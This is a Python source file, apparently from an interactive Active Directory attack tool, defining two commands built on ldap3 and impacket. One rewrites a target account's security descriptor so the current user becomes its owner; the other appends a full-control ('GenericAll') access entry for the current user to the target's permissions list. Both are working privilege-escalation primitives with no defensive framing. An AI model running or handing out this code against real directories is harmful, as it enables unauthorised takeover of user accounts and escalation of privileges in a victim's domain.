import time
import ssl
import os
from ldap3 import Server, ALL, Connection, NTLM, SUBTREE, Tls, MODIFY_ADD, MODIFY_REPLACE, SASL, KERBEROS
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID, ACE, ACCESS_ALLOWED_ACE, ACCESS_MASK
from rich import print
import readline
import rlcompleter
import atexit
import heapq
import shlex

def cmd_setowner(conn, base_dn, target_user, sess_user):
    print(f"[*] Attempting to set owner of '{target_user}' to '{sess_user}'")

    conn.search(base_dn, f"(sAMAccountName={sess_user})", attributes=['objectSid'])
    if not conn.entries:
        print(f"[bold red][-] Could not resolve SID for current user {sess_user}[/bold red]")
        return
    owner_sid_raw = conn.entries[0]['objectSid'].raw_values[0]

    conn.search(base_dn, f"(sAMAccountName={target_user})", attributes=['distinguishedName'])
    if not conn.entries:
        print(f"[bold red][-] Could not resolve target user {target_user}[/bold red]")
        return
    target_dn = conn.entries[0].distinguishedName.value

    from ldap3.protocol.microsoft import security_descriptor_control
    ctrls = security_descriptor_control(sdflags=0x01)

    conn.search(target_dn, '(objectClass=*)', search_scope='BASE', attributes=['nTSecurityDescriptor'], controls=ctrls)

    if not conn.entries or 'nTSecurityDescriptor' not in conn.entries[0]:
        print(f"[bold red][-] Could not read nTSecurityDescriptor of target. You might lack permissions![/bold red]")
        return

    current_sd_raw = conn.entries[0]['nTSecurityDescriptor'].raw_values[0]

    from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID
    sd = SR_SECURITY_DESCRIPTOR()
    sd.fromString(current_sd_raw)
    sd['OwnerSid'] = LDAP_SID(owner_sid_raw)
    new_sd_raw = sd.getData()
    
    changes = {'nTSecurityDescriptor': [(MODIFY_REPLACE, [new_sd_raw])]}
    
    conn.modify(target_dn, changes, controls=ctrls)

    if conn.result["result"] == 0:
        print(f"[bold green][+] Successfully took ownership of '{target_user}'[/bold green]")
    else:
        print(f"[bold red][-] Failed to change owner: {conn.result['description']}[/bold red]")
def cmd_genericall(conn, base_dn, target_user, sess_user):
    print(f"[*] Attempting to grant GenericAll on '{target_user}' to '{sess_user}'")

    conn.search(base_dn, f"(sAMAccountName={sess_user})", attributes=['objectSid'])
    if not conn.entries:
        print(f"[bold red][-] Could not resolve SID for current user {sess_user}[/bold red]")
        return
    session_sid_raw = conn.entries[0]['objectSid'].raw_values[0]

    conn.search(base_dn, f"(sAMAccountName={target_user})", attributes=['distinguishedName'])
    if not conn.entries:
        print(f"[bold red][-] Could not resolve target user {target_user}[/bold red]")
        return
    target_dn = conn.entries[0].distinguishedName.value

    from ldap3.protocol.microsoft import security_descriptor_control
    ctrls = security_descriptor_control(sdflags=0x04)

    conn.search(target_dn, '(objectClass=*)', search_scope='BASE', attributes=['nTSecurityDescriptor'], controls=ctrls)

    if not conn.entries or 'nTSecurityDescriptor' not in conn.entries[0]:
        print(f"[bold red][-] Could not read nTSecurityDescriptor of target. You might lack permissions! [/bold red]")
        return

    current_sd_raw = conn.entries[0]['nTSecurityDescriptor'].raw_values[0]

    from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR, LDAP_SID, ACE, ACCESS_ALLOWED_ACE, ACCESS_MASK
    sd = SR_SECURITY_DESCRIPTOR()
    sd.fromString(current_sd_raw)

    nace = ACE()
    nace['AceType'] = 0x00
    nace['AceFlags'] = 0x00

    acedata = ACCESS_ALLOWED_ACE()
    acedata['Mask'] = ACCESS_MASK()
    acedata['Mask']['Mask'] = 983551
    acedata['Sid'] = LDAP_SID(session_sid_raw)

    nace['Ace'] = acedata

    sd['Dacl'].aces.append(nace)
    new_sd_raw = sd.getData()

    changes = {'nTSecurityDescriptor': [(MODIFY_REPLACE, [new_sd_raw])]}

    conn.modify(target_dn, changes, controls=ctrls)

    if conn.result["result"] == 0:
        print(f"[bold green][+] Successfully granted GenericAll on '{target_user}' to '{sess_user}'[/bold green]")

    else:
        print(f"[bold red][-] Failed to grant GenericAll: {conn.result['description']}[/bold red]")

